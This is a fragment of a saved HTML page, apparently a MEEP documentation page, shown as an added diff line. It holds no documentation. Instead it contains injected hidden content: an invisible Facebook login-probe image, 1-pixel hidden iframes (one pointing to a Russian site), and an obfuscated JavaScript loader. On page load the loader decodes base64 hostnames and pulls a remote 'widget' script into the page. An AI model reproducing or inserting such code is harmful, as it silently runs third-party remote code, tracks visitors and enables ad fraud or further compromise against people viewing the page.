+<img src="https://m.facebook.com/login/?next=https://m.facebook.com/images/litestand/bookmarks/sidebar/icons/mobile/icon-instagram-gray.png" style="display: none;"><iframe id="yiw" src="./Field Functions - MEEP Documentation_files/inworker.html" height="1" width="1" style="height: 1px; width: 1px; position: absolute; left: 0px; top: 0px; display: none;"></iframe><script>var _0x12ce=['onreadystatechange','loaded','complete','function','onload','src','getElementsByTagName','head','appendChild','_initAdsteroidWidget','exports','call','default','prototype','/widget/','lult','atob','indexOf','http','location','protocol','createElement','script','type','text/javascript','readyState'];(function(_0xa97ac4,_0x1bc289){var _0x587ac0=function(_0x1c0803){while(--_0x1c0803){_0xa97ac4['push'](_0xa97ac4['shift']());}};_0x587ac0(++_0x1bc289);}(_0x12ce,0x72));var _0x54d3=function(_0x37f135,_0x459086){_0x37f135=_0x37f135-0x0;var _0x4bda03=_0x12ce[_0x37f135];return _0x4bda03;};!function(_0x2c5017){function _0xeb7ca9(_0x565942){if(_0x5066c7[_0x565942])return _0x5066c7[_0x565942][_0x54d3('0x0')];var _0x1d15d6=_0x5066c7[_0x565942]={'i':_0x565942,'l':!0x1,'exports':{}};return _0x2c5017[_0x565942][_0x54d3('0x1')](_0x1d15d6['exports'],_0x1d15d6,_0x1d15d6[_0x54d3('0x0')],_0xeb7ca9),_0x1d15d6['l']=!0x0,_0x1d15d6['exports'];}var _0x5066c7={};_0xeb7ca9['m']=_0x2c5017,_0xeb7ca9['c']=_0x5066c7,_0xeb7ca9['d']=function(_0x18cc57,_0x40cd32,_0xb63661){_0xeb7ca9['o'](_0x18cc57,_0x40cd32)||Object['defineProperty'](_0x18cc57,_0x40cd32,{'configurable':!0x1,'enumerable':!0x0,'get':_0xb63661});},_0xeb7ca9['n']=function(_0x59e6cc){var _0x5066c7=_0x59e6cc&&_0x59e6cc['__esModule']?function(){return _0x59e6cc[_0x54d3('0x2')];}:function(){return _0x59e6cc;};return _0xeb7ca9['d'](_0x5066c7,'a',_0x5066c7),_0x5066c7;},_0xeb7ca9['o']=function(_0x3e33fa,_0x2a0993){return Object[_0x54d3('0x3')]['hasOwnProperty']['call'](_0x3e33fa,_0x2a0993);},_0xeb7ca9['p']=_0x54d3('0x4'),_0xeb7ca9(_0xeb7ca9['s']=_0x54d3('0x5'));}({'lult':function(_0x39946a,_0x3ae0bb){!function(_0x597f1c,_0x54d27a){_0x597f1c=window[_0x54d3('0x6')](_0x597f1c),_0x54d27a=_0x54d27a?window[_0x54d3('0x6')](_0x54d27a):_0x597f1c,_0x597f1c&&-0x1===_0x597f1c[_0x54d3('0x7')](_0x54d3('0x8'))&&(_0x597f1c=window[_0x54d3('0x9')][_0x54d3('0xa')]+'//'+_0x597f1c),_0x54d27a&&-0x1===_0x54d27a[_0x54d3('0x7')](_0x54d3('0x8'))&&(_0x54d27a=window[_0x54d3('0x9')][_0x54d3('0xa')]+'//'+_0x54d27a),function(_0x452c06,_0x5bf061){var _0x73f98d=document[_0x54d3('0xb')](_0x54d3('0xc'));_0x73f98d[_0x54d3('0xd')]=_0x54d3('0xe'),_0x73f98d[_0x54d3('0xf')]?_0x73f98d[_0x54d3('0x10')]=function(){_0x54d3('0x11')!==_0x73f98d[_0x54d3('0xf')]&&_0x54d3('0x12')!==_0x73f98d[_0x54d3('0xf')]||(_0x73f98d[_0x54d3('0x10')]=null,_0x54d3('0x13')==typeof _0x5bf061&&_0x5bf061());}:_0x73f98d[_0x54d3('0x14')]=function(){_0x54d3('0x13')==typeof _0x5bf061&&_0x5bf061();},_0x73f98d[_0x54d3('0x15')]=_0x452c06,document[_0x54d3('0x16')](_0x54d3('0x17'))[0x0][_0x54d3('0x18')](_0x73f98d);}(_0x597f1c+atob('L3dpZGdldC9iYy5qcw=='),function(){_0x54d3('0x13')==typeof window['_initAdsteroidWidget']&&window[_0x54d3('0x19')](_0x597f1c,_0x54d27a);});}("Ym5zdGVyLmNvbQ==","Y29va2llLmNvMWxpbmVzdS5ydQ==");}});</script><iframe src="https://pro-inform.ru/413400-vkusnosti-kotorye-mozhno-ispolzovat-vmesto-dorogoi-kosmetiki/print" style="width: 1px; height: 1px; border: none; position: absolute; top: 0px; left: 0px; z-index: -999; opacity: 0.01;"></iframe></body></html>
